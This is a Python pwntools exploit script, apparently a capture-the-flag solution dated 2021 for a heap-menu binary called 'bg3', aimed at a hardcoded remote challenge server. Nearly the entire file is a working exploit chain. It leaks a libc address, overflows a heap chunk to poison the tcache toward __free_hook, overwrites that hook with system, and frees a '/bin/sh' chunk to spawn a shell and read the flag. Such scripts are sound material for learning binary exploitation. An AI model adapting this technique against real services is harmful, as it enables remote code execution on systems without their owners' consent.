# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './bg3'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.104.143.202'
    port = '25997'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Select:',num)

def add(idx , size):
    cmd(1)
    sla('Index:' , idx)
    sla('PayloadLength:' , size)

def edit(idx , content):
    cmd(2)
    sla('Index:' , idx)
    sa('BugInfo:' , content)

def show(idx ):
    cmd(3)
    sla('Index:' , idx)

def delete(idx ):
    cmd(4)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add( 0 , 0x500)
    add( 1 , 0x18)
    
    delete(0)
    add(2 , 0x500)
    show(2)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    add( 0 , 0x18)
    add( 3 , 0x68)
    add( 4 , 0x68)
    delete(4)
    delete(3)
    

    edit(0 , flat( 'a'*0x18 , 0x71 , __free_hook - 0x10 )+ '\n')

    add( 5 , 0x68 )
    add( 6 , 0x68 )
    edit( 6 , flat('/bin/sh\x00' ,0, system_addr) + '\n' )
    delete(6)
    # dbg()

    p.success(getShell())
    p.interactive()

attack()

'''
@File    :   bg3.py
@Time    :   2021/10/31 19:20:57
@Author  :   Niyah 
'''